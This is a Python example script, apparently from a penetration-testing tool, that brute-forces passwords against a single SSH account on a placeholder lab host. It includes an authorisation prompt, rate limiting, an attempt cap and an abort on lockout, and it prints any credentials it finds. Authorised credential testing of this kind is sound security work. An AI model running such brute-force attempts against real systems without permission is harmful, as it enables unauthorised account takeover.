"""Brute-force credential test against a single SSH account.

Pattern: iterate every password in the candidate list against ONE
target user. This is the noisy-by-design counterpart to spray, so the
script:

* runs at 20/min by default (slower than spray's 30/min, because
  per-user lockout fires *fast* on this pattern),
* aborts on the first lockout signal,
* writes a JSON resume file so Ctrl-C is recoverable.

Edit ``TARGET_HOST`` / ``USERNAME`` / ``PASSWORDS`` and run
``python examples/bruteforce_ssh.py``.

See docs/CRED_ATTACK.md before running.
"""

from __future__ import annotations

import logging
import sys
from pathlib import Path

# --- Edit me -----------------------------------------------------------------

TARGET_HOST = "lab.example.internal"
TARGET_PORT = 22
USERNAME = "service-account"

# Tiny demo list. Replace with a Path() to a real wordlist file:
#   PASSWORDS = (line.strip() for line in Path("/path/to/list.txt").open() if line.strip())
PASSWORDS = [
    "Welcome123",
    "ChangeMe!",
    "Summer2026!",
    "Autumn2026!",
    "Spring2026!",
]

RATE_PER_MIN = 20.0
RESUME_FILE = Path.home() / ".axross-bruteforce.json"
MAX_ATTEMPTS = 200


# --- Confirmation gate -------------------------------------------------------


def confirm() -> bool:
    target = f"ssh://{USERNAME}@{TARGET_HOST}:{TARGET_PORT}"
    print("This script will fire SSH password-auth attempts at:")
    print(f"  {target}")
    print(f"  rate={RATE_PER_MIN}/min  max_attempts={MAX_ATTEMPTS}")
    print(f"  resume file: {RESUME_FILE}")
    print("It will STOP at the first lockout signal.")
    print("Only proceed if you have written authorisation to test this host.")
    answer = input("Type 'yes' to continue, anything else to abort: ").strip().lower()
    return answer in ("y", "yes")


def main() -> int:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s: %(message)s",
    )
    if not confirm():
        print("Aborted.", file=sys.stderr)
        return 2

    from core.cred_attack import AttemptOutcome, AttemptResult, bruteforce
    from core.profiles import ConnectionProfile

    profile = ConnectionProfile(
        name="example-ssh-bruteforce",
        protocol="sftp",  # axross uses 'sftp' for SSH-over-port-22.
        host=TARGET_HOST,
        port=TARGET_PORT,
        username=USERNAME,
        auth_type="password",
    )

    def show(outcome: AttemptOutcome) -> None:
        marker = {
            AttemptResult.SUCCESS: "+",
            AttemptResult.LOCKOUT: "!",
            AttemptResult.ERROR: "?",
            AttemptResult.FAILED: "-",
            AttemptResult.SKIPPED: "·",
        }.get(outcome.result, "?")
        print(
            f"  [{marker}] {outcome.password_hash:<20} {outcome.result.value:<8} "
            f"{outcome.elapsed_s:>5.2f}s",
        )

    report = bruteforce(
        profile,
        users=[USERNAME],
        passwords=PASSWORDS,
        rate_per_min=RATE_PER_MIN,
        max_attempts=MAX_ATTEMPTS,
        state_file=RESUME_FILE,
        progress=show,
        authorized=True,
    )
    print()
    print(report.summary())
    if report.successes:
        print("Discovered credentials:")
        for cred in report.successes:
            print(f"  {cred.username} : {cred.password}")
    if report.aborted:
        print(f"Aborted: {report.abort_reason}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
